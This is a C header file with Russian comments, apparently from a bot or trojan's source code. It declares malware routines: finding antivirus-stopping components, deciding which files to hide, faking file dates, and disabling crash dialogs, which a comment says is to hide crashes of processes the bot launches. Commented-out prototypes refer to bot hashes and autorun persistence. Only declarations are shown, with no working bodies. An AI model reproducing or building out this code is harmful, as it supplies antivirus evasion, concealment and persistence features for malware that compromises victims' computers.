#include <windows.h>

DWORD SignalFirstRun( DWORD dwParam );


//DWORD GetBotHash();
//WCHAR *GetBotPath();
//void AddToAutoRun( WCHAR *ModulePath );
//void AddToAutoRun( WCHAR *TempFileName );


WCHAR *GetStopAVPath();
WCHAR *GetMiniAVPath();

WCHAR *GetTempName();


WCHAR *GetShellFoldersKey( DWORD dwParam );

void CopyFileToTemp( WCHAR *Path, WCHAR *Temp );

void SetFakeFileDateTime(PCHAR Path);
void SetFakeFileDateTimeW(PWCHAR Path);


//----------------------------------------------------------------------------
//  IsHideFile - Функция возвращает истину, если необходимо спрятать
//               указанный файл
//----------------------------------------------------------------------------
BOOL IsHide( DWORD dwFileHash );
BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint);

//----------------------------------------------------------------------------
// DisableShowFatalErrorDialog - функция устанавливает режим отображения
//         ошибок при котором система не будет отображать сообщение о крахе
//         процесса. Тем самым мы скроем крах запущенных ботом процессов
//----------------------------------------------------------------------------
void DisableShowFatalErrorDialog();
